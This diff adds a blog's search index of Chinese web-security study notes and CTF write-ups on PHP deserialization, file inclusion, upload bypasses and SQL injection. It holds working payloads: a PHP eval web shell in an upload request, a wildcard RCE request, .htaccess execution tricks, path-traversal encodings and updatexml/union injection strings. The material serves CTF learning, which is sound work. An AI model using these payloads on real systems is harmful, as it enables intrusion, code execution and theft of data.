@@ -1,0 +1,764 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>序列化</title>
+    <url>/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="序列化反序列化"><a href="#序列化反序列化" class="headerlink" title="序列化反序列化"></a>序列化反序列化</h1><p>反序列化漏洞专题</p>
+<p>代码审计重点：</p>
+<p>1、在源代码审计的时候要确认代码逻辑安全性</p>
+<p>2、在做在吗审计的时候要确认调用函数的安全性</p>
+<h5 id="PASS-1"><a href="#PASS-1" class="headerlink" title="PASS-1"></a>PASS-1</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;Micheal&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> seralize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;demoTest&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Micheal&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;man&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">31</span>;&#125;</span><br><span class="line">O表示一个类</span><br><span class="line">字符类型：名称个数：“名称”;(：如果是类这便是key/value的个数：)</span><br><span class="line">    key：value一组</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果有类的反序列化题目就会先走（自动触发）__destruct（）这个魔法函数</p>
+<p>如果OP===2</p>
+<p>则把op复制成‘1’</p>
+<p>然后把conent的值赋空字符串</p>
+<p>然后调用process（）方法函数<img src="/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt="1"></p>
+<p>如果op==1则调用write方法</p>
+<p>如果op==2则调用read（）返回一个res并且输出</p>
+<p>如果都不满足则输出 bad hacker！</p>
+<p>如果要读取flag肯定调用read（）方法</p>
+<p><img src="/2022/01/27/%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt="2"></p>
+<p>直接序列化控制其中的变量</p>
+<h2 id="漏洞本质："><a href="#漏洞本质：" class="headerlink" title="漏洞本质："></a>漏洞本质：</h2><p>unserialize函数的变量可控</p>
+<p>php文件重存在可利用类，类中有魔术方法</p>
+<h3 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h3><p>__construct(), __destruct()</p>
+<p>__call(),\ __callStatic()</p>
+<p>__get(), __set()</p>
+<p>__isset(),__unset()</p>
+<p>__sleep(), __wakeup()</p>
+<p>__toString()</p>
+<p>__invoke()</p>
+<p>__set_state()</p>
+<p>__clone()</p>
+<p>__debugInfo()</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>%00截断</p>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>%00阻断</p>
+<p>php://filter/read=convert.base64-encode/resource=</p>
+<h3 id="文件包含-挖掘经验"><a href="#文件包含-挖掘经验" class="headerlink" title="文件包含-挖掘经验"></a>文件包含-挖掘经验</h3><p>• 模块加载、cache调用，传入的参数拼接包含路径</p>
+<p>• include()</p>
+<p>使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</p>
+<p>• inclue_once()</p>
+<p>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
+<p>• require()</p>
+<p>使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并</p>
+<p>立即终止程序。</p>
+<p>• require_once()</p>
+<p>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</p>
+<p>了解常见的文件包含点</p>
+<p>会基本利用文件包含点，包括伪协议等</p>
+<p>查看服务器 apche或者nginx（/var/log/nginx/access.log）</p>
+<p>找到它默认的服务器日志存放位置</p>
+<p>读文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" alt="1"></p>
+<p>被包含的文件如果含有&lt;?php &lt;? 等php投，里面的php代码就会被执行</p>
+<p>require或者include</p>
+<p>常见可在服务器上生成文件的功能</p>
+<p>1、文件上传</p>
+<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png" alt="2"></p>
+<p>file=***则存在文件包含漏洞</p>
+<p>2、服务器日志目录一般在（/var/log/apache2/assess.logAPACHE协议）<em><strong>用post请求发送，来源用referer</strong></em></p>
+<p>3、程序本身自带备份功能（MyWebSQL）</p>
+<p>php://filter=伪协议</p>
+<p>/?file=php://filter/read=convert.base64-encode/resource=xxx.php</p>
+<h2 id="文件读取-挖掘经验"><a href="#文件读取-挖掘经验" class="headerlink" title="文件读取-挖掘经验"></a>文件读取-挖掘经验</h2><h4 id="load-file-函数"><a href="#load-file-函数" class="headerlink" title="load_file()函数"></a>load_file()函数</h4><p>1、必须有权限读取并且文件必须完全刻度</p>
+<p>2、想要读取的文件必须再服务器上</p>
+<p>3、必须指定文件完整的路劲</p>
+<p>4、想要读文件必须小于max_allowed_packet</p>
+<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png" alt="3"></p>
+<p>• fopen()</p>
+<p>• file_get_contents()</p>
+<p>• fread</p>
+<p>• fgets</p>
+<p>• fgetss</p>
+<p>• file</p>
+<p>• fpassthru</p>
+<p>• parse_ini_file</p>
+<p>• readfile</p>
+<p> allow_url_fopen选项激活了 URL 形式的 fopen 封装协议</p>
+<p>使得可以访问 URL 对象例如文件。默认的封装协议提供用</p>
+<p>ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可</p>
+<p>能会注册更多的封装协议</p>
+<h2 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h2><p>unlink（）</p>
+<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png" alt="4"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> extract ( <span class="variable">$array</span> , extract_rules,prefix ) </span><br><span class="line">    </span><br><span class="line">•<span class="variable">$array</span> 关联的数组，受第二个和第三个参数的影响。 </span><br><span class="line">•extract_rules 对待非法／数字和冲突的键名的方法将根据取出标记</span><br><span class="line">•prefix 仅在第二个参数特殊时需要，添加前缀</span><br><span class="line"><span class="comment"># extract（）变量覆盖</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="**parse_str()**变量覆盖"></a>**parse_str()**变量覆盖</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> parse_str ( <span class="keyword">string</span> <span class="variable">$encoded_string</span> [, <span class="keyword">array</span> &amp;<span class="variable">$result</span> ] )</span><br><span class="line"><span class="comment"># $encoded_string 输入的字符串</span></span><br><span class="line"><span class="comment"># $result 变量将会以数组元素的形式存入到这个数组，作为替代</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">import_request_variables()</span><br><span class="line">    (PHP <span class="number">4</span> &gt;= <span class="number">4.1</span>.<span class="number">0</span>, PHP <span class="number">5</span> &lt; <span class="number">5.4</span>.<span class="number">0</span>)</span><br><span class="line">import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</span><br><span class="line"><span class="keyword">bool</span> import_request_variables ( <span class="keyword">string</span> <span class="variable">$types</span> [, <span class="keyword">string</span> <span class="variable">$prefix</span> ] )</span><br><span class="line"><span class="comment"># $type 指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie</span></span><br><span class="line"><span class="comment"># $prefix 变量名前缀</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="危险函数："><a href="#危险函数：" class="headerlink" title="危险函数："></a>危险函数：</h3><p>•<strong>EXTR_OVERWRITE</strong> - 默认。如果有冲突，则覆盖已有的变量。</p>
+<p>•EXTR_SKIP - 如果有冲突，不覆盖已有的变量。（忽略数组中同名的元素）</p>
+<p><strong>•EXTR_PREFIX_SAME</strong> - 如果有冲突，在变量名前加上前缀 prefix。自 PHP 4.0.5 起，这也包括了对数字</p>
+<p>索引的处理</p>
+<p>•EXTR_PREFIX_ALL - 给所有变量名加上前缀 prefix（第三个参数）</p>
+<p>•EXTR_PREFIX_INVALID - 仅在非法或数字变量名前加上前缀 prefix。本标记是 PHP 4.0.5 新加的。</p>
+<p>•<strong>EXTR_IF_EXISTS</strong> - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经</p>
+<p>定义了一组合法的变量，然后要从一个数组例如 $_REQUEST 中提取值覆盖这些变量的场合。本标记是 PH</p>
+<p>P 4.2.0 新加的。</p>
+<p>•EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不</p>
+<p>处理。本标记是 PHP 4.2.0 新加的。</p>
+<p>•EXTR_REFS - 将变量作为引用提取。这有力地表明了导入的变量仍然引用了 var_array 参数的值。可以</p>
+<p>单独使用这个标志或者在 extract_type 中用 OR 与其它任何标志结合使用。本标记是 PHP 4.3.0 新加</p>
+<p>的。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2022/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h4 id="目录穿越绕过方式"><a href="#目录穿越绕过方式" class="headerlink" title="目录穿越绕过方式"></a>目录穿越绕过方式</h4><p>进行URL编码</p>
+<p>点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c</p>
+<p>进行16为Unicode编码</p>
+<p>点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216</p>
+<p>进行双倍URL编码</p>
+<p>点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c</p>
+<p>进行超长UTF-8 Unicode编码</p>
+<p>点–&gt;%c0%2e %e0$40%ae %c0ae</p>
+<p>反斜杠–&gt;%c0af %e0%80af %c0%af</p>
+<p>正斜杠–&gt;%c0%5c %c0%80%5c</p>
+<p>文件上传绕过客户端</p>
+<p>• 1.用firebug将form表单中的onsubmit事件删除</p>
+<p>• 2.上传木马文件，Burp拦截数据包，修改扩展名</p>
+<p>代码案例：</p>
+<p>name：客户端的原始上传文件名称</p>
+<p>• Type：上传文件的MIME类型</p>
+<p>• Tmp_name：服务器端用来保存上传文件的临时文件路径</p>
+<p>• Error：上传文件时的错误信息</p>
+<p>• Size：上传文件的大小，单位是</p>
+<p>• Content-Length,即上传内容大小</p>
+<p>• MAX_FILE_SIZE,即上传内容的最大长度</p>
+<p>• filename,即上传文件名</p>
+<p>• Content-Type,即上传文件类型</p>
+<p>• 请求包中的乱码字段，即是所上传文件的内容</p>
+<p>• 有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现</p>
+<p>php上传机制：</p>
+<p>0x01 PHP上传机制<br>php文件上传时会先将上传的文件保存到upload_tmp_dir该配置目录下，这里为/tmp，而上传页面只负责把该文件拷贝到目标目录。也就是说不管该php页面有没有文件上传功能，我们只要上传了文件，该文件就会被上传到upload_tmp_dir配置的目录下，上传完后会被删除。</p>
+<p>这里本地实验了一下，的确如此，我使用的是win10下phpstudy复现。</p>
+<p>需要把upload_tmp_dir 改为D:\phpStudy\tmp\tmp</p>
+<p>然后用intruder不停发包</p>
+<p>POST /test.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Content-Type: multipart/form-data; boundary=—————————10242300956292313528205888<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Length: 244</p>
+<p>—————————–10242300956292313528205888<br>Content-Disposition: form-data; name=”userfile1”; filename=”5.txt”<br>Content-Type: text/plain</p>
+<?php @eval($_POST['y1ng']); ?><p>—————————–10242300956292313528205888–</p>
+<p>最后发现了我们上传的文件：</p>
+<p>可惜我打开之后全是空的，不知道是不是因为已经被删除了。</p>
+<p>0x02 PHP命令执行<br>eval($cmd);<br>1<br>执行命令方式：</p>
+<p>system(‘ls’);</p>
+<p>echo(<code>ls</code>);</p>
+<p>echo+反引号</p>
+<p>?&gt;&lt;?=<code>ls</code>;</p>
+<?=是echo()的别名用法，不需要开启short_open_tag。
+需要先?><p>把前面的&lt;?php给闭合掉</p>
+<p>0x03 通配符与无字母数组命令执行</p>
+<p>既然./exp.txt可以用./??p????代替</p>
+<p>那么我们上传的临时文件phpxxxxx.tmp也可以用php?????.tmp代替</p>
+<p>0x04 解题<br>POST /?cmd=?&gt;&lt;?=<code>.+/??p/p?p??????</code>; HTTP/1.1<br>Host: 47fa7ca7-058a-42ff-b48f-de0382f95387.chall.ctf.show<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Content-Type: multipart/form-data; boundary=—————————10242300956292313528205888<br>Accept-Encoding: gzip, deflate<br>Connection: keep-alive<br>Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>Content-Length: 242</p>
+<p>—————————–10242300956292313528205888<br>Content-Disposition: form-data; name=”fileUpload”; filename=”1.txt”<br>Content-Type: text/plain</p>
+<p>#! /bin/bash</p>
+<p>cat /flag.txt<br>—————————–10242300956292313528205888–<br>0x05 .+/解释<br>我在做这道题的时候对于这个.+/有点不理解，还以为是通配符，后来才知道这里的.居然是个命令。source命令可简写为一个点.。</p>
+<p>linux .(点命令)：读取并且在当前的shell中执行文件中的命令<br>1<br>放个图你们就理解了</p>
+<p>点执行了tmp文件里的内容ls，所以这道题中.就是为了执行我们上传的文件中的cat /flag.txt。</p>
+<p>后记<br>这里的解释在p神的文章里都有，之前没仔细看，血亏，搞的似懂非懂很难受。。</p>
+<p><em><strong>判断服务器类型</strong></em></p>
+<p>看看是不是apache类型</p>
+<p>是就上传.htaccess</p>
+<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/1.png" alt="1">把我们上传的文件等当成php运行</p>
+<p>AddType application/x-httpd-php.jpg</p>
+<p>将jpg文件当成php来执行</p>
+<p>其他的上传.user.ini</p>
+<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/3.png" alt="3"></p>
+<p>php的上传接受multipart/form-data，然后会将它保存在临时文件中。php.ini中设置的<code>upload_tmp_dir</code>就是这个临时文件的保存目录。linux下默认为<code>/tmp</code>。也就是说，只要是php接收到上传的POST请求，就会保存一个临时文件，如何这个php脚本具有“上传功能”那么它将拷贝走，无论如何当脚本执行结束这个临时文件都会被删除。另外，这个php临时文件在linux系统下的命名规则永远是<code>phpXXXXXX</code></p>
+<p><img src="/2022/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/2.png" alt="2"></p>
+<p>php临时文件存储在linux系统中的名称规则永远是php后面跟六个随机字母</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>王鼎杯2020青龙组AreUSerialz</title>
+    <url>/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/</url>
+    <content><![CDATA[<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>同样先进去看看发现是一道序列化题目</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/1.png" alt="1"></p>
+<p>然后进行代码审计</p>
+<p>注意：这类型题目在进行反序列化时首先调用的是__destruct()魔术方法</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/2.png" alt="2"></p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/5.png" alt="5"></p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/4.png" alt="4"></p>
+<p>我们可以看到这里上面的2是强比较类型（同类型同大小同数值）而下面是弱比较类型不一定需要类型相同所以要绕过这个if我们可以直接用int类型2</p>
+<p>可以看到我们可以进行文件读取filename就是我们需要读取的文件路径</p>
+<p>我们可以通过php伪协议进行读取</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>所以我们需要改的参数只有op以及filename</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">``protected` `$op``=2;</span><br><span class="line">``protected` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">``protected` `$content``;</span><br></pre></td></tr></table></figure>
+
+<p>我们直接进行序列化</p>
+<p>注意class类型序列化时需要先实例化对象</p>
+<p>最后都得到</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/8.png" alt="8"></p>
+<p>发现有三个显示不正确的地方</p>
+<p>上网查了一下发现是%00的编码无法通过上面的is_valid函数校验（参考文档：<a class="link" href="https://www.cnblogs.com/Cl0ud/p/12874458.html%EF%BC%89">https://www.cnblogs.com/Cl0ud/p/12874458.html）<i class="fas fa-external-link-alt"></i></a></p>
+<p>最简单的解决办法是将上面类中的对象转换成public类型（因为php7+版本对属性不敏感）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">public` `$op``=2;</span><br><span class="line">public` `$filename``=``&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;``;</span><br><span class="line">public` `$content``;</span><br></pre></td></tr></table></figure>
+
+<p>最后得到</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/7.png" alt="7"></p>
+<p>最后用get方式传进str</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/9.png" alt="9"></p>
+<p>最后进行base64解码就行了</p>
+<p><img src="/2022/01/28/%E7%8E%8B%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84AreUSerialz/11.png" alt="11"></p>
+<p>flag{242b88d2-1121-4c83-a6e4-7685dc25adfb}</p>
+]]></content>
+      <tags>
+        <tag>网鼎杯</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极客大挑战HardSQL</title>
+    <url>/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/</url>
+    <content><![CDATA[<h1 id="极客大挑战Hardsql"><a href="#极客大挑战Hardsql" class="headerlink" title="极客大挑战Hardsql"></a>极客大挑战Hardsql</h1><p>// 题目是一个很容易的报错题目</p>
+<p>首先判断出错点：</p>
+<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/1.png" alt="1"></p>
+<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/2.png" alt="2"></p>
+<p>尝试得出是字符串注入单引号闭合</p>
+<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/3.png" alt="3"></p>
+<p>经过尝试判断出此题过滤空格等于号等字符</p>
+<p>我们可以用括号进行绕过</p>
+<p>因为无法回显所以想到报错注入</p>
+<p>此题可以用的是xpath注入</p>
+<p>也就是updatexml以及extractvalue()注入</p>
+<p>用updatexml为例：</p>
+<p>构造payload</p>
+<p>因为用or不好连接而此题没有屏蔽符号所以用^来代替or</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">password=admin&#x27;^updatexml(1,concat(0x7e,database()),1)%23				// 0x7e是~ %23是url编码的#</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/4.png" alt="4"></p>
+<p>得知库为geek</p>
+<p>接下来就爆表爆字段</p>
+<p>表payload:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin&#x27;^updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))),1)%23</span><br><span class="line">因为此题过滤了=所以用like进行绕过作用相同</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/5.png" alt="5"></p>
+<p>字段payload：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">admin&#x27;^updatexml(1,concat(0x7e,(select(column_name)from(information_schema.columns)where(table_name)like(&#x27;geek&#x27;))),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/6.png" alt="6"></p>
+<p>最终payload：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=admin&#x27;^updatexml(1,concat(0x7e,(select(password)from(H4rDsq1))),1)%23</span><br></pre></td></tr></table></figure>
+
+<p>注意：xpath函数报错只会回显32个字符</p>
+<p>最后进行拼接得出flag</p>
+<p><img src="/2022/01/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98HardSQL/7.png" alt="7">flag{fd706149-94a1-449c-b1ee-68f4af78dd5d}</p>
+]]></content>
+      <tags>
+        <tag>极客大挑战</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>你传你🐎呢</title>
+    <url>/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/</url>
+    <content><![CDATA[<h1 id="做了一下-MRCTF2020-你传你🐎呢"><a href="#做了一下-MRCTF2020-你传你🐎呢" class="headerlink" title="做了一下[MRCTF2020]你传你🐎呢"></a>做了一下[MRCTF2020]你传你🐎呢</h1><p>进去是这样<img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/1.png" alt="1"></p>
+<p>发现是一个文件上传漏洞</p>
+<p>先上传任意文件试试</p>
+<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/2.png" alt="2"></p>
+<p>发现有问题</p>
+<p>测试一下发现只有png格式可以上传</p>
+<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/3.png" alt="3"></p>
+<p>尝试抓包把Content-Type改成image/png将getshell代码变成图片上传</p>
+<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/4.png" alt="4"></p>
+<p>这时候我们可以通过上传htaccess文件将图片变成可执行的代码（我前面的文件上传中有写）</p>
+<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/5.png" alt="5"></p>
+<p>然后用蚂剑链接</p>
+<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/6.png" alt="6"></p>
+<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/7.png" alt="7"></p>
+<p>文件无法用cat直接获取翻看一下目录</p>
+<p>发现flag在根目录下读取</p>
+<p><img src="/2022/01/28/%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/8.png" alt="8"></p>
+<p>flag{bfed417c-0c19-4b10-9e6f-4bcc4c1d60de}</p>
+]]></content>
+      <tags>
+        <tag>MRCTF2020</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>(GXYCTF2019)BabySQli</title>
+    <url>/2022/01/28/GXYCTF2019-BabySQli/</url>
+    <content><![CDATA[<h1 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h1><p>进入题目是这样：</p>
+<p><img src="/2022/01/28/GXYCTF2019-BabySQli/1.png" alt="1"></p>
+<p>这种题目先抓包测试</p>
+<p><img src="/2022/01/28/GXYCTF2019-BabySQli/2.png" alt="1"></p>
+<p>看到有提示，解码一下（需要一次base32和一次base64解码）</p>
+<p>得到提示</p>
+<p><img src="/2022/01/28/GXYCTF2019-BabySQli/3.png" alt="1"></p>
+<p>知道这题是单引号注入</p>
+<p>用wfuzz测试一下过滤</p>
+<p>发现只过滤了一些=，or之类的</p>
+<p>用orderby测试一下列数</p>
+<p><img src="/2022/01/28/GXYCTF2019-BabySQli/4.png" alt="1"></p>
+<p>发现是3列</p>
+<p>因为知道是user表所以测试一下admin跟password在那一列</p>
+<p><img src="/2022/01/28/GXYCTF2019-BabySQli/5.png" alt="1"></p>
+<p><img src="/2022/01/28/GXYCTF2019-BabySQli/6.png" alt="1"></p>
+<p>发现第二列是admin时爆的是密码错误</p>
+<p>所以第二列是name第三列是密码</p>
+<p>后面涉及到一个知识点：</p>
+<p>大部分数据库的密码存储的时候是按照md5（）编码的</p>
+<p>所以这里只需要你的密码的md5的值跟第三列相同就可以插入这个账号密码登录</p>
+<p>所以构造payload：</p>
+<p>1’/**/union/**/select/**/1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123</p>
+<p>得到flag：flag{0359ac43-f3e7-4ac6-8152-109ce5428190}</p>
+]]></content>
+      <tags>
+        <tag>GXYCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>myphpsite</title>
+    <url>/2022/01/28/myphpsite/</url>
+    <content><![CDATA[<h1 id="My-php-site"><a href="#My-php-site" class="headerlink" title="My php site"></a>My php site</h1><p>拿到题目先看看</p>
+<p>发现这是一个php网页</p>
+<p>而且网页头以get方式传送了地址</p>
+<p><img src="/2022/01/28/myphpsite/1.png" alt="1"></p>
+<p>所以想到用伪协议来读取文件地址</p>
+<p>尝试一下拿他现在的页面看看能不能读到</p>
+<p><img src="/2022/01/28/myphpsite/2.png" alt="2"></p>
+<p><img src="/2022/01/28/myphpsite/3.png" alt="2"></p>
+<p>拿去解码一下发现可以</p>
+<p>接下来尝一下php网页</p>
+<p><img src="/2022/01/28/myphpsite/7.png" alt="2"></p>
+<p><img src="/2022/01/28/myphpsite/4.png" alt="2"></p>
+<p>代码审计一下</p>
+<p>发现这个下面给出了flag文件的名字</p>
+<p>读取一下</p>
+<p><img src="/2022/01/28/myphpsite/8.png" alt="2"></p>
+<p>解码一下</p>
+<p><img src="/2022/01/28/myphpsite/6.png" alt="2"></p>
+<p>得到flag</p>
+<p>KCTF{L0C4L_F1L3_1ncLu710n}</p>
+]]></content>
+      <tags>
+        <tag>knightctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Obsfuscation Isn&#39;t Enough</title>
+    <url>/2022/01/28/Obsfuscation-Isn-t-Enough/</url>
+    <content><![CDATA[<h1 id="Obsfuscation-Isn’t-Enough"><a href="#Obsfuscation-Isn’t-Enough" class="headerlink" title="Obsfuscation Isn’t Enough"></a>Obsfuscation Isn’t Enough</h1><p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/4.png" alt="1"></p>
+<p>猜测可能是sql注入但是不管，先看看源代码</p>
+<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/1.png" alt="1"></p>
+<p>发现一串很奇怪的符号其实是jsfuck</p>
+<p>可以直接拿到进开发者工具中执行</p>
+<p><img src="/2022/01/28/Obsfuscation-Isn-t-Enough/2.png" alt="1"></p>
+<p>发现其中返回了location，直接进入那个页面看看</p>
